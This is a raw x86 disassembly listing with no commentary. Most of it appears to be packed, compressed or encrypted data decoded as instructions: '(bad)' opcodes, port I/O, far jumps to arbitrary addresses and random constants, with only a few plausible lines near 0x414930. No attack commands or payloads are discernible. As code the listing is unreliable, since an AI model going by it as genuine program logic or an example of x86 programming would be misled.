  4144cf:	fwait
  4144d0:	sbb    al,0x43
  4144d2:	arpl   ax,bx
  4144d4:	fcomp  st(0)
  4144d6:	mov    edx,DWORD PTR [edx+eax*4-0x41]
  4144da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144db:	cmp    al,0x9
  4144dd:	and    al,BYTE PTR [edi-0x16aaa620]
  4144e3:	popf   
  4144e4:	pushf  
  4144e5:	cmp    edi,esi
  4144e7:	cmp    esp,DWORD PTR [esi]
  4144e9:	out    0x9,al
  4144eb:	or     ecx,edx
  4144ed:	cmp    BYTE PTR [ebx-0x11b8a4c7],bh
  4144f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144f4:	lock scas al,BYTE PTR es:[edi]
  4144f6:	add    eax,0x65d1ea21
  4144fb:	xchg   edi,eax
  4144fc:	push   es
  4144fd:	lock (bad) 
  4144ff:	lods   eax,DWORD PTR ds:[esi]
  414500:	add    eax,0xecfe7c20
  414505:	test   BYTE PTR [edi],dh
  414507:	push   edx
  414508:	add    eax,DWORD PTR [ebx]
  41450a:	call   0x1d571c36
  41450f:	scas   al,BYTE PTR es:[edi]
  414510:	and    edi,0x69
  414513:	mov    ah,0x2e
  414515:	into   
  414516:	out    dx,al
  414517:	test   DWORD PTR [esi],ebp
  414519:	pop    es
  41451a:	or     eax,0x1c6eca6
  41451f:	mov    fs,WORD PTR [ecx+0x35]
  414522:	or     DWORD PTR [esi+0x544612ab],0xffffff97
  414529:	icebp  
  41452a:	pop    ebp
  41452b:	sbb    eax,0xdec3fbb5
  414530:	test   al,0xef
  414532:	and    edx,DWORD PTR [edx-0x2c41a3f9]
  414538:	in     eax,0xf4
  41453a:	fwait
  41453b:	jmp    0x73ea7bca
  414540:	mov    ?,WORD PTR [ebp-0x3170a7cb]
  414546:	sbb    eax,0x52248559
  41454b:	std    
  41454c:	shl    bl,cl
  41454e:	jp     0x414579
  414550:	(bad)  
  414551:	lock stos BYTE PTR es:[edi],al
  414553:	(bad)  
  414554:	test   eax,0xe3c77af6
  414559:	cmp    bl,ah
  41455b:	sub    DWORD PTR [eax-0x5a9153b8],esp
  414561:	lock stos BYTE PTR es:[edi],al
  414563:	mov    WORD PTR [eax],?
  414565:	pushf  
  414566:	dec    eax
  414567:	mov    ds:0xdf118fc5,eax
  41456c:	aam    0xa8
  41456e:	ins    BYTE PTR es:[edi],dx
  41456f:	neg    BYTE PTR [ebp+0x4d]
  414572:	cmp    dh,cl
  414574:	sbb    al,0xd1
  414576:	pop    es
  414577:	fwait
  414578:	int    0x6b
  41457a:	add    BYTE PTR [edx+0x4f],ah
  41457d:	pushf  
  41457e:	mov    esi,0xe4d0b521
  414583:	(bad)  
  414584:	(bad)  
  414585:	in     eax,dx
  414586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414587:	pop    ecx
  414588:	add    ch,BYTE PTR [ecx]
  41458a:	mov    dl,0x46
  41458c:	fimul  WORD PTR [ebx+0x21dbab1e]
  414592:	ins    DWORD PTR es:[edi],dx
  414593:	push   ds
  414594:	pop    ebp
  414595:	mov    dl,0x46
  414597:	pop    edx
  414598:	mov    eax,ds:0x501c11f6
  41459d:	inc    eax
  41459e:	pop    ebp
  41459f:	mov    ch,BYTE PTR [esi]
  4145a1:	sub    DWORD PTR [ecx-0x1a],eax
  4145a4:	clc    
  4145a5:	(bad)  
  4145a7:	xor    ah,BYTE PTR [edi*2-0x17dbb539]
  4145ae:	push   ebp
  4145af:	mov    al,ds:0x24140020
  4145b4:	call   0x6115:0x302e9b68
  4145bb:	mov    ah,0xbe
  4145bd:	stos   BYTE PTR es:[edi],al
  4145be:	lods   eax,DWORD PTR ds:[esi]
  4145bf:	and    edi,DWORD PTR ds:0xf16f27d1
  4145c5:	jbe    0x41455a
  4145c7:	fldcw  WORD PTR [edi+0x37]
  4145ca:	es aam 0xbc
  4145cd:	inc    ebx
  4145ce:	xchg   edi,eax
  4145cf:	dec    ebp
  4145d0:	adc    al,0x37
  4145d2:	sub    BYTE PTR ds:0xbf887c18,dl
  4145d8:	and    bl,BYTE PTR [esi-0x55c9f37d]
  4145de:	adc    DWORD PTR [ebx+0x2a],ecx
  4145e1:	aas    
  4145e2:	outs   dx,BYTE PTR ds:[esi]
  4145e3:	mov    ds:0xda55bed,al
  4145e8:	sbb    ch,BYTE PTR [esi]
  4145ea:	adc    ah,BYTE PTR [esi]
  4145ec:	into   
  4145ed:	or     edx,edx
  4145ef:	mov    ds:0xe437dd8a,eax
  4145f4:	je     0x41459c
  4145f6:	mov    edi,0x12aea11a
  4145fb:	(bad)  
  4145fc:	push   esp
  4145fd:	imul   eax,DWORD PTR [ebx],0x74911cb3
  414603:	pushf  
  414604:	jae    0x414670
  414606:	inc    sp
  414608:	pop    edx
  414609:	ds cmp eax,0xc1f4a2d
  41460f:	fld    st(5)
  414611:	data16 (bad) 
  414613:	pop    esi
  414614:	dec    edx
  414615:	cdq    
  414616:	fcomp  QWORD PTR [eax-0x22]
  414619:	retf   0xec05
  41461c:	ja     0x41466f
  41461e:	jge    0x4145f5
  414620:	pop    ss
  414621:	call   0x5221:0xd6031af2
  414628:	inc    edx
  414629:	mov    WORD PTR [esi+esi*4-0x5e],ss
  41462d:	(bad)  
  41462e:	aaa    
  41462f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414630:	jns    0x41466c
  414632:	aad    0xa3
  414634:	in     eax,0xe0
  414636:	pop    ecx
  414637:	mov    dh,0x6e
  41463a:	out    dx,eax
  41463b:	test   BYTE PTR [eax-0x47],0xf4
  41463f:	mov    eax,0xaed041e4
  414644:	jns    0x4145ec
  414646:	jo     0x414629
  414648:	pushf  
  414649:	loopne 0x41469f
  41464b:	sbb    BYTE PTR [ebx-0x1dc5bc4d],0xe1
  414652:	jecxz  0x414660
  414654:	jg     0x414649
  414656:	pop    es
  414657:	inc    edi
  414658:	jae    0x414695
  41465a:	ins    BYTE PTR es:[edi],dx
  41465b:	fs jae 0x41460c
  41465e:	(bad)  
  41465f:	xchg   ebp,eax
  414660:	push   es
  414661:	inc    edx
  414662:	addr16 sbb esi,esi
  414665:	std    
  414666:	inc    al
  414668:	add    bl,al
  41466a:	sar    BYTE PTR [esi+0x773c4b0c],1
  414670:	cmp    al,0x83
  414672:	(bad)  
  414673:	pusha  
  414674:	dec    ebx
  414675:	clc    
  414676:	int3   
  414677:	push   ecx
  414678:	cmp    dh,BYTE PTR [ebp-0x70c54312]
  41467e:	mov    eax,0xeae722f8
  414683:	jge    0x414692
  414685:	cmp    eax,0xf13a084a
  41468a:	stc    
  41468b:	cli    
  41468c:	dec    ebp
  41468d:	sub    eax,0x7331e2b2
  414692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414693:	mov    ss,ebx
  414695:	ins    BYTE PTR es:[edi],dx
  414696:	addr16 pop ebx
  414698:	mov    eax,ds:0x634fe9ed
  41469d:	push   es
  41469e:	fiadd  WORD PTR [edx-0x40f1090c]
  4146a4:	sahf   
  4146a5:	popf   
  4146a6:	inc    eax
  4146a7:	fmul   QWORD PTR [ebp-0x79c83e05]
  4146ad:	cmp    dl,ah
  4146af:	jnp    0x414690
  4146b1:	mov    al,0xdd
  4146b3:	inc    esp
  4146b4:	xchg   edx,eax
  4146b5:	mov    esp,0x62169562
  4146ba:	std    
  4146bb:	cmp    DWORD PTR [edi+0x40],eax
  4146be:	cwde   
  4146bf:	fldenv [eax-0x46]
  4146c2:	sub    ebp,DWORD PTR [esi-0x4c358de]
  4146c8:	push   ss
  4146c9:	sti    
  4146ca:	mov    ds:0x3d4b4476,eax
  4146cf:	inc    esi
  4146d0:	clc    
  4146d1:	lahf   
  4146d2:	test   eax,0xe883ed28
  4146d7:	xchg   ebp,eax
  4146d8:	bound  esi,QWORD PTR [esi-0x7ed774ba]
  4146de:	jmp    0x2e2c37c9
  4146e3:	adc    ecx,edx
  4146e5:	push   0xffffffdf
  4146e7:	or     ebx,DWORD PTR [edx-0x12]
  4146ea:	jmp    0x4146f5
  4146ec:	mov    ah,0xe6
  4146ee:	xchg   ebp,eax
  4146ef:	cmp    BYTE PTR [ecx],bl
  4146f1:	sub    bh,BYTE PTR ds:0x81197f19
  4146f7:	ins    DWORD PTR es:[edi],dx
  4146f8:	add    ebp,DWORD PTR [edx+0x7eab9fe1]
  4146fe:	inc    eax
  4146ff:	gs cld 
  414701:	imul   ebx,DWORD PTR ds:0x1af52f6c,0xfffffff2
  414708:	scas   eax,DWORD PTR es:[edi]
  414709:	(bad)  
  41470b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41470d:	and    ah,BYTE PTR [ecx-0x7b487937]
  414713:	sub    eax,0x2b350684
  414718:	ffree  st(6)
  41471a:	cmp    BYTE PTR [ebp-0x78cecea9],bh
  414720:	mov    cl,0xfc
  414722:	(bad)  
  414723:	add    al,0x3e
  414726:	pop    ebp
  414727:	cdq    
  414728:	sbb    eax,0xdca784b7
  41472d:	push   eax
  41472e:	push   edx
  41472f:	je     0x414781
  414731:	aam    0x8
  414733:	xchg   esi,eax
  414734:	clc    
  414735:	aas    
  414736:	adc    al,0x3c
  414738:	mov    eax,0x444692e3
  41473d:	mov    bh,0xe5
  41473f:	add    al,0xb4
  414741:	jg     0x4146ec
  414743:	pop    esp
  414744:	fild   DWORD PTR [eax+0x360089e]
  41474a:	pop    esi
  41474b:	sbb    eax,0x253099ef
  414750:	(bad)  [ecx+0x6f]
  414753:	sbb    al,0xc6
  414755:	(bad)  
  414756:	aas    
  414757:	push   ebx
  414758:	sub    BYTE PTR [esi],0x74
  41475b:	pop    ecx
  41475c:	mov    edi,0x88564337
  414761:	jmp    0x414783
  414763:	sbb    al,0x20
  414765:	inc    eax
  414766:	pop    es
  414767:	jl     0x41471b
  414769:	sub    eax,DWORD PTR [eax+0x51]
  41476c:	push   edi
  41476d:	cmp    edi,DWORD PTR [esi]
  41476f:	push   0xffffffee
  414771:	enter  0xd5fa,0xb9
  414775:	hlt    
  414776:	ja     0x414747
  414778:	rcl    BYTE PTR [edi+0x33],0x4e
  41477c:	jl     0x4147c2
  41477e:	pop    esi
  41477f:	div    DWORD PTR [ecx+0x69]
  414782:	pop    DWORD PTR [edx]
  414784:	ins    DWORD PTR es:[edi],dx
  414785:	daa    
  414786:	or     ebp,0x7ce90976
  41478c:	mov    ?,edx
  41478e:	out    0x95,eax
  414790:	push   ecx
  414791:	sub    di,di
  414794:	cmp    al,BYTE PTR [esi+0x24]
  414797:	jns    0x41471e
  414799:	fadd   st,st(1)
  41479b:	push   esi
  41479c:	retf   0xa9db
  41479f:	dec    eax
  4147a0:	bound  ecx,QWORD PTR [esi+0xf48199f]
  4147a6:	ja     0x414768
  4147a8:	ins    DWORD PTR es:[edi],dx
  4147a9:	nop
  4147aa:	in     eax,0x90
  4147ac:	add    BYTE PTR [edi+0x2d],cl
  4147af:	mov    eax,ds:0x6ee62df
  4147b4:	stc    
  4147b5:	inc    eax
  4147b6:	int    0x7e
  4147b8:	aas    
  4147b9:	jb     0x41474d
  4147bb:	push   cs
  4147bc:	es sar ah,cl
  4147bf:	ficom  WORD PTR [eax+ebp*4]
  4147c2:	adc    ebp,DWORD PTR [ecx+esi*1]
  4147c5:	adc    eax,0x30b2b9e1
  4147ca:	fld    DWORD PTR [edi]
  4147cc:	pop    ds
  4147cd:	lock int 0x41
  4147d0:	in     eax,dx
  4147d1:	mov    ah,BYTE PTR [esp+esi*8-0x10]
  4147d5:	popa   
  4147d6:	out    dx,eax
  4147d7:	(bad)  
  4147d8:	test   BYTE PTR [ebp*2+0x44091b01],bl
  4147df:	sub    ah,BYTE PTR [esi+0x8]
  4147e2:	idiv   DWORD PTR [edx-0x5b362d4c]
  4147e8:	(bad)  
  4147e9:	leave  
  4147ea:	(bad)  
  4147ec:	pop    ebp
  4147ed:	jl     0x41483e
  4147ef:	mov    ds:0xc8733baa,eax
  4147f4:	jno    0x41485d
  4147f6:	mov    ah,0x5f
  4147f8:	repz neg edx
  4147fb:	cmc    
  4147fc:	scas   eax,DWORD PTR es:[edi]
  4147fd:	or     edx,esp
  4147ff:	outs   dx,DWORD PTR ds:[esi]
  414800:	sub    eax,0xfb363017
  414805:	(bad)  [eax]
  414807:	aam    0x19
  414809:	outs   dx,BYTE PTR ds:[esi]
  41480a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41480b:	mov    esp,0x63a63f39
  414810:	call   0x817f3f0c
  414815:	jns    0x4147e3
  414817:	jmp    0x41483e
  414819:	scas   al,BYTE PTR es:[edi]
  41481a:	jnp    0x414826
  41481c:	xchg   edx,eax
  41481d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41481e:	test   al,0xbd
  414820:	aas    
  414821:	imul   ecx,DWORD PTR [ecx+0x4def8b77],0xb7c96800
  41482b:	or     al,0xa7
  41482d:	xchg   edi,eax
  41482e:	jg     0x414850
  414830:	adc    eax,0xbf40cb35
  414835:	push   ebp
  414836:	int    0x47
  414838:	enter  0x238f,0xcb
  41483c:	(bad)  
  41483d:	inc    esp
  41483e:	int3   
  41483f:	bound  edx,QWORD PTR [edi+0x3d]
  414842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414843:	jp     0x414842
  414845:	dec    ebp
  414846:	mov    bl,0x67
  414848:	inc    eax
  414849:	loop   0x414817
  41484b:	sub    al,0x9
  41484d:	jns    0x414815
  41484f:	data16 gs lahf 
  414852:	mov    dl,0xaf
  414854:	xchg   esp,eax
  414855:	mov    cl,0xf
  414857:	test   DWORD PTR [ebx+0x36],esp
  41485a:	and    edx,edx
  41485c:	pop    esp
  41485d:	push   ebp
  41485e:	inc    edx
  41485f:	ret    0x2a7e
  414862:	mov    esi,0xeb5af2c9
  414867:	into   
  414868:	and    eax,0x39f25544
  41486d:	es jbe 0x41481c
  414870:	cmp    BYTE PTR [ebx+0x57],ch
  414873:	scas   eax,DWORD PTR es:[edi]
  414874:	test   BYTE PTR [eax-0x6],bh
  414877:	aas    
  414878:	dec    esi
  414879:	pop    ecx
  41487a:	mov    ds:0x9cf5a3f1,eax
  41487f:	adc    al,0x9
  414881:	xchg   esp,eax
  414882:	(bad)  
  414883:	sbb    al,0x3b
  414885:	sub    al,BYTE PTR [esi+0x488540ae]
  41488b:	xor    DWORD PTR [esi],esi
  41488d:	lds    esp,FWORD PTR [ebx]
  41488f:	retf   
  414890:	push   cs
  414891:	fldcw  WORD PTR [ecx]
  414893:	and    DWORD PTR [eax],eax
  414895:	pop    edx
  414896:	repz fwait
  414898:	gs ins BYTE PTR es:[edi],dx
  41489a:	ss mov ebx,0xdbee6b39
  4148a0:	push   edi
  4148a1:	je     0x4148b5
  4148a3:	jge    0x41484a
  4148a5:	call   0xec13a27d
  4148aa:	mov    edx,0xa8f7b1c7
  4148af:	push   ds
  4148b0:	pusha  
  4148b1:	jnp    0x414866
  4148b3:	sub    al,0xee
  4148b5:	cmp    bl,cl
  4148b7:	out    dx,al
  4148b8:	push   0x65
  4148ba:	or     bl,ch
  4148bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148bd:	sbb    dl,BYTE PTR [esi-0x32]
  4148c0:	jno    0x414867
  4148c2:	daa    
  4148c3:	stos   BYTE PTR es:[edi],al
  4148c4:	or     eax,0xff1fc23f
  4148c9:	rcr    BYTE PTR [esi-0x4e],0x23
  4148cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ce:	and    eax,0x5eae8b0f
  4148d3:	loop   0x414875
  4148d5:	add    DWORD PTR [eax+0x6238b958],0x40561d0e
  4148df:	fldenv [ebx]
  4148e1:	mov    ds:0x5ec81bec,al
  4148e6:	sub    DWORD PTR [ecx+0x79],ecx
  4148e9:	ins    BYTE PTR es:[edi],dx
  4148ea:	dec    ecx
  4148eb:	sbb    esi,esi
  4148ed:	dec    esp
  4148ee:	xchg   ecx,eax
  4148ef:	sbb    BYTE PTR [edx+0x7cb54930],dh
  4148f5:	jge    0x4148d8
  4148f7:	mov    esi,0x644702ce
  4148fc:	adc    al,0x88
  4148fe:	adc    al,ah
  414900:	mov    edi,0xa0fe5ae4
  414905:	xchg   DWORD PTR [eax],edi
  414907:	push   ds
  414908:	dec    ebp
  414909:	pop    eax
  41490a:	and    dh,BYTE PTR [eax]
  41490c:	loop   0x41493a
  41490e:	add    BYTE PTR [ebx-0x70],cl
  414911:	out    dx,al
  414912:	loopne 0x414926
  414914:	arpl   dx,bx
  414916:	aam    0x28
  414918:	call   0x9383:0xaa7bfc67
  41491f:	or     BYTE PTR [edx+0x6257cabd],cl
  414925:	jb     0x414987
  414927:	adc    edi,eax
  414929:	jbe    0x41499d
  41492b:	xchg   ebx,edx
  41492d:	inc    ebx
  41492e:	push   ebx
  41492f:	pop    eax
  414930:	call   DWORD PTR [eax-0x1]
  414933:	mov    eax,DWORD PTR [ebp-0x38]
  414936:	mov    ecx,DWORD PTR ds:0x426b3e
  41493c:	add    DWORD PTR [eax],ecx
  41493e:	pop    edi
  41493f:	jmp    0x414e4a
  414944:	(bad)  
  414945:	rol    ah,1
  414947:	int3   
  414948:	fcmove st,st(4)
  41494a:	(bad)  
  41494b:	fimul  DWORD PTR [ebp-0x787ce223]
  414951:	cld    
  414952:	cmp    edi,0xffffffb2
  414955:	and    al,0x7f
  414957:	js     0x4149c3
  414959:	jl     0x4149d3
  41495b:	js     0x414956
  41495d:	mov    ch,0x77
  41495f:	gs jo  0x4149db
  414962:	gs pushf 
  414964:	loop   0x414978
  414966:	and    eax,0x7d1a8b3a
  41496b:	ret    0x7d16
  41496e:	fsubr  DWORD PTR [edx+0x6d]
  414971:	push   0xffffff9e
  414973:	test   ebp,ecx
  414975:	pop    eax
  414976:	cmp    DWORD PTR [esi+0xb9e588d],0xffffff82
  41497d:	in     al,dx
  41497e:	icebp  
  41497f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414981:	sahf   
  414982:	idiv   BYTE PTR [esi+eax*4]
  414985:	add    eax,ecx
  414987:	adc    al,0x30
  414989:	mov    ah,0xbf
  41498b:	sbb    dh,0xa2
  41498e:	imul   esi,DWORD PTR [edi-0x1d],0x27a70aeb
  414995:	cdq    
  414996:	add    dl,BYTE PTR [edx-0x3e704bd0]
  41499c:	mov    ch,0xec
  41499e:	cmp    BYTE PTR fs:[eax+0x36b4f11e],ch
  4149a5:	and    edx,DWORD PTR [eax-0x27]
  4149a8:	adc    edx,ecx
  4149aa:	sub    BYTE PTR [ecx+ecx*1+0x776c9e45],dh
  4149b1:	fs ret 
  4149b3:	in     al,dx
  4149b4:	scas   eax,DWORD PTR es:[edi]
  4149b5:	(bad)  
  4149b6:	iret   
  4149b7:	pop    esp
  4149b8:	dec    edi
  4149b9:	nop
  4149ba:	ficom  DWORD PTR [esi+0x18]
  4149bd:	sti    
  4149be:	pushf  
  4149bf:	jge    0x414a3a
  4149c1:	adc    BYTE PTR [ebx],ch
  4149c3:	pop    edi
  4149c4:	ss push esi
  4149c6:	dec    esp
  4149c7:	mov    edi,0xcdf02f96
  4149cc:	mov    BYTE PTR [ebx+0x75dbb13f],ch
  4149d2:	addr16 out dx,al
  4149d4:	(bad)  
  4149d5:	jns    0x414a4f
  4149d7:	jge    0x4149af
  4149d9:	pop    esp
  4149da:	leave  
  4149db:	hlt    
  4149dc:	dec    ebx
  4149dd:	in     al,dx
  4149de:	cld    
  4149df:	and    DWORD PTR [edx+0x20da70f8],ecx
  4149e5:	sar    edi,cl
  4149e7:	sbb    eax,DWORD PTR [ecx-0x54917552]
  4149ed:	loop   0x4149e1
  4149ef:	inc    edx
  4149f0:	lods   eax,DWORD PTR ds:[esi]
  4149f1:	in     eax,0x3
  4149f3:	mov    WORD PTR [eax],fs
  4149f5:	xchg   ecx,eax
  4149f6:	and    al,BYTE PTR [ebp+0x7c068fc0]
  4149fc:	into   
  4149fd:	pop    es
  4149fe:	enter  0x84d3,0xff
  414a02:	pop    edx
  414a03:	push   ds
  414a04:	sti    
  414a05:	pop    ss
  414a06:	or     cl,BYTE PTR [eax-0x4ad91e2]
  414a0c:	rcr    dl,1
  414a0e:	jbe    0x4149ac
  414a10:	cli    
  414a11:	push   es
  414a12:	inc    ebx
  414a13:	ja     0x414a09
  414a15:	std    
  414a16:	pop    es
  414a17:	jl     0x414a53
  414a19:	dec    esp
  414a1a:	test   DWORD PTR [ecx],edx
  414a1c:	adc    ebx,ebp
  414a1e:	mov    ebp,0xb58b8cd7
  414a23:	adc    eax,0x456af69e
  414a28:	test   eax,0x8aab4b79
  414a2d:	dec    ecx
  414a2e:	inc    ebp
  414a2f:	and    ebx,ebx
  414a31:	xchg   al,dh
  414a33:	test   DWORD PTR [ebx+0x4],ecx
  414a36:	popa   
  414a37:	pop    ebx
  414a38:	push   cs
  414a39:	xchg   ebp,eax
  414a3a:	and    DWORD PTR ds:0x74121636,edx
  414a40:	test   DWORD PTR [edx],ecx
  414a42:	lods   eax,DWORD PTR ds:[esi]
  414a43:	push   ds
  414a44:	dec    edi
  414a45:	int3   
  414a46:	jp     0x414ac0
  414a48:	out    dx,al
  414a49:	in     eax,0xb5
  414a4b:	imul   ebx,DWORD PTR [edx-0x1e],0xffffff88
  414a4f:	stc    
  414a50:	push   ss
  414a51:	push   edx
  414a52:	out    0x81,eax
  414a54:	(bad)  [ecx-0x23]
  414a57:	cdq    
  414a58:	push   eax
  414a59:	inc    edi
  414a5a:	stos   BYTE PTR es:[edi],al
  414a5b:	mov    ebx,DWORD PTR [esi+0x12]
  414a5e:	mov    ecx,0xe3816f82
  414a63:	repnz push eax
  414a65:	shl    BYTE PTR [esp+eiz*2],1
  414a68:	mov    ecx,cs
  414a6a:	std    
  414a6b:	jae    0x414ac7
  414a6d:	dec    esi
  414a6e:	mov    edx,0x9e16b862
  414a73:	mov    al,BYTE PTR [ecx*2-0x578bdded]
  414a7a:	cs pop ds
  414a7c:	push   ss
  414a7d:	test   al,0x4b
  414a7f:	div    DWORD PTR [ecx+0x7d]
  414a82:	dec    ebx
  414a83:	pop    edi
  414a84:	or     dl,BYTE PTR [edi-0x7295e6db]
  414a8a:	fwait
  414a8b:	loop   0x414a99
  414a8d:	pusha  
  414a8e:	rcr    edi,cl
  414a90:	je     0x414a5e
  414a92:	or     al,0xbd
  414a94:	xchg   edi,eax
  414a95:	push   0xffffffac
  414a97:	xor    BYTE PTR [edx-0x3f],cl
  414a9a:	xchg   edx,eax
  414a9b:	jbe    0x414b09
  414a9d:	daa    
  414a9e:	push   edi
  414a9f:	xlat   BYTE PTR ds:[ebx]
  414aa0:	int    0x32
  414aa2:	mov    dl,0xcf
  414aa4:	mov    edx,0x3dab1213
  414aa9:	rol    BYTE PTR [esi-0x4a],1
  414aac:	icebp  
  414aad:	cmp    BYTE PTR [ebx-0x799451fc],al
  414ab3:	sti    
  414ab4:	mov    dl,0xbf
  414ab6:	push   0x1c40ed01
  414abb:	cmp    al,dh
  414abd:	jecxz  0x414a9a
  414abf:	pop    ds
  414ac0:	mov    dh,0x73
  414ac2:	add    DWORD PTR [ebx],0x9
  414ac5:	lea    ebx,[ebp-0x3497197d]
  414acb:	cmp    bh,BYTE PTR [esi-0x4b9dfae3]
  414ad1:	sub    eax,0x579e30fa
  414ad6:	clc    
  414ad7:	mov    BYTE PTR [ecx+0x24],bl
  414ada:	adc    BYTE PTR [edx+0x17c1efb8],0xd
  414ae1:	inc    edx
  414ae2:	push   edi
  414ae3:	leave  
  414ae4:	bound  eax,QWORD PTR [edx-0xdd462a6]
  414aea:	pop    ecx
  414aeb:	pop    edi
  414aec:	enter  0xfe77,0x6b
  414af0:	adc    BYTE PTR [ebp+0x42781476],bl
  414af6:	mov    esi,0xe3ba8a64
  414afb:	ret    
  414afc:	xor    DWORD PTR [esi],edi
  414afe:	in     al,dx
  414aff:	jge    0x414ac2
  414b01:	pop    ebx
  414b02:	scas   al,BYTE PTR es:[edi]
  414b03:	mov    edx,0x60b29b29
  414b08:	pop    eax
  414b09:	adc    ch,BYTE PTR [eax]
  414b0b:	and    ecx,DWORD PTR [ebx+edx*1-0x8]
  414b0f:	inc    esp
  414b10:	inc    eax
  414b11:	xchg   ebp,eax
  414b12:	int3   
  414b13:	adc    bl,BYTE PTR ds:0x4d1f02bf
  414b19:	ins    BYTE PTR es:[edi],dx
  414b1a:	mov    al,ds:0xb0500f3c
  414b1f:	popf   
  414b20:	xor    DWORD PTR ds:0x4cdd4dea,esi
  414b26:	push   0x5a
  414b28:	mov    DWORD PTR [ecx],eax
  414b2a:	lds    esp,FWORD PTR [ecx-0x3063a0cc]
  414b30:	push   es
  414b31:	push   cs
  414b32:	sbb    al,0x8f
  414b34:	jg     0x414b4a
  414b36:	daa    
  414b37:	pop    ebp
  414b38:	retf   0x33be
  414b3b:	mov    bh,0x4a
  414b3d:	ins    BYTE PTR es:[edi],dx
  414b3e:	retf   
  414b3f:	sub    DWORD PTR [ecx-0x730fbbf4],edx
  414b45:	and    BYTE PTR [eax],ch
  414b47:	jmp    0x86be:0x12c6e071
  414b4e:	push   0x65bea7bc
  414b53:	aas    
  414b54:	mov    ds:0x32b0626,eax
  414b59:	bound  ebx,QWORD PTR [edx+0x393892ba]
  414b5f:	xchg   al,dl
  414b61:	mov    esi,0xc7809e99
  414b66:	sahf   
  414b67:	mov    es:0xe88fcdcd,al
  414b6d:	push   cs
  414b6e:	inc    ebp
  414b6f:	and    al,al
  414b71:	sub    esi,DWORD PTR [eax+0x3f]
  414b74:	out    0x58,eax
  414b76:	ret    
  414b77:	pusha  
  414b78:	repnz daa 
  414b7a:	out    0xe6,al
  414b7c:	adc    al,0xed
  414b7e:	ss and ecx,edx
  414b81:	pusha  
  414b82:	xchg   ebx,eax
  414b83:	inc    ebx
  414b84:	push   cs
  414b85:	mov    DWORD PTR [eax-0x65],eax
  414b88:	cmp    al,0x89
  414b8a:	repz retf 0x8d9b
  414b8e:	and    eax,0xc96d15b6
  414b93:	outs   dx,DWORD PTR ds:[esi]
  414b94:	loop   0x414bfb
  414b96:	repnz std 
  414b98:	add    eax,0xa03372e4
  414b9d:	pop    ecx
  414b9e:	sbb    eax,0xa3868d58
  414ba3:	ja     0x414be5
  414ba5:	sahf   
  414ba6:	cmp    DWORD PTR [eax+0x54],eax
  414ba9:	clc    
  414baa:	push   edi
  414bab:	jp     0x414b50
  414bad:	lsl    esp,bx
  414bb0:	scas   eax,DWORD PTR es:[edi]
  414bb1:	(bad)  
  414bb2:	fist   WORD PTR [ebx+0x60e1135a]
  414bb8:	test   DWORD PTR ss:[ebx],ebp
  414bbb:	in     al,dx
  414bbc:	dec    esp
  414bbd:	aaa    
  414bbe:	push   ebp
  414bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bc0:	test   al,0xf4
  414bc2:	cmp    esp,edi
  414bc4:	pop    ebx
  414bc5:	arpl   WORD PTR [ebp+0x64f4e937],cx
  414bcb:	outs   dx,BYTE PTR ds:[esi]
  414bcc:	push   esi
  414bcd:	push   0xb3986fca
  414bd2:	mov    ebp,0xd501eb9a
  414bd7:	lock adc al,0x58
  414bda:	jg     0x414bb7
  414bdc:	push   edi
  414bdd:	push   ds
  414bde:	ins    DWORD PTR es:[edi],dx
  414bdf:	and    BYTE PTR [eax],0xe7
  414be2:	pop    ds
  414be3:	adc    al,0x7d
  414be5:	jne    0x414b74
  414be7:	test   al,dh
  414be9:	ja     0x414bee
  414beb:	mov    ebx,0x5a95fc6e
  414bf0:	loope  0x414c48
  414bf2:	sti    
  414bf3:	enter  0x5fd1,0xaf
  414bf7:	retf   0xabb7
  414bfa:	lods   al,BYTE PTR ds:[esi]
  414bfb:	out    0xc1,al
  414bfd:	jmp    0x414bdf
  414bff:	idiv   BYTE PTR [eax+0x23342248]
  414c05:	in     eax,0x43
  414c07:	(bad)  
  414c08:	push   esi
  414c09:	pop    ebx
  414c0a:	or     BYTE PTR [eax+edx*2],0xd9
  414c0e:	ins    BYTE PTR es:[edi],dx
  414c0f:	push   esp
  414c10:	mov    esp,0xc6d9254f
  414c15:	xor    DWORD PTR [ebx],ecx
  414c17:	ror    BYTE PTR [edi*4-0x72764c54],1
  414c1e:	aaa    
  414c1f:	or     edi,DWORD PTR [edx]
  414c21:	xchg   ebx,eax
  414c22:	int3   
  414c23:	lock pop ebx
  414c25:	dec    edi
  414c26:	int    0xe3
  414c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c29:	push   edi
  414c2a:	in     al,0x52
  414c2c:	push   es
  414c2d:	scas   eax,DWORD PTR es:[edi]
  414c2e:	ror    esp,0x70
  414c31:	es retf 0x5db7
  414c35:	inc    ebp
  414c36:	xchg   esi,eax
  414c37:	jbe    0x414bbf
  414c39:	jmp    0x3e765313
  414c3e:	and    ah,bh
  414c40:	xchg   ecx,eax
  414c41:	fdiv   st(3),st
  414c43:	pop    eax
  414c44:	sub    bh,BYTE PTR [ebp+0x62]
  414c47:	and    edx,0x1c
  414c4a:	pop    ebx
  414c4b:	adc    DWORD PTR [esi-0x1e824146],eax
  414c51:	mov    al,dh
  414c53:	jb     0x414c07
  414c55:	sbb    DWORD PTR [ecx+0x76e9cbfd],esp
  414c5b:	jle    0x414c2f
  414c5d:	xchg   ebp,edi
  414c5f:	fptan  
  414c61:	add    dl,cl
  414c63:	jae    0x414ca0
  414c65:	retf   
  414c66:	in     al,dx
  414c67:	inc    esp
  414c68:	in     al,dx
  414c69:	out    dx,eax
  414c6a:	ins    DWORD PTR es:[edi],dx
  414c6b:	or     dl,0x11
  414c6e:	(bad)  
  414c6f:	into   
  414c70:	push   esp
  414c71:	mov    al,0x95
